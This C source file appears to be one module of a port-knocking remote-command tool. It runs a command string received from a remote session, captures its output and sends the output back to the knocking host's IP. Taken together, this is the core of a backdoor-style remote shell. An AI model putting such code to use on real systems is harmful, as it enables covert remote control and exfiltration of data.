#include "process_launcher.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include "unistd.h"
#include "utils.h"

void run_process(const struct session_info * session_info, char * command) {
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) {
        perror("Failed to create pipe");
        return;
    }

    const pid_t pid = fork();
    if (pid == -1) {
        perror("Failed to fork");
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return;
    }

    if (pid == 0) {
        close(pipe_fd[0]);
        dup2(pipe_fd[1], STDOUT_FILENO);
        dup2(pipe_fd[1], STDERR_FILENO);
        close(pipe_fd[1]);

        char * args[64] = {0};
        int argc = 0;
        char * token = strtok(command, " ");
        while (token != NULL && argc < 63) {
            args[argc++] = token;
            token = strtok(NULL, " ");
        }
        args[argc] = NULL;

        execvp(args[0], args);

        perror("Failed to execvp");
        exit(1); // Exit out of child not main process
    }

    close(pipe_fd[1]);

    char output[RESPONSE_BUFFER_LENGTH] = {0};
    size_t total_read = 0;
    ssize_t bytes_read;

    while (total_read < sizeof(output) - 1 && (bytes_read = read(pipe_fd[0], output + total_read, sizeof(output) - 1 - total_read)) > 0) {
        total_read += bytes_read;
    }

    output[total_read] = '\0';
    close(pipe_fd[0]);

    waitpid(pid, NULL, 0);

    log_message("Output:\n%s", output);

    // send this output to remote and send the response command
    send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, output);
    send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);
}
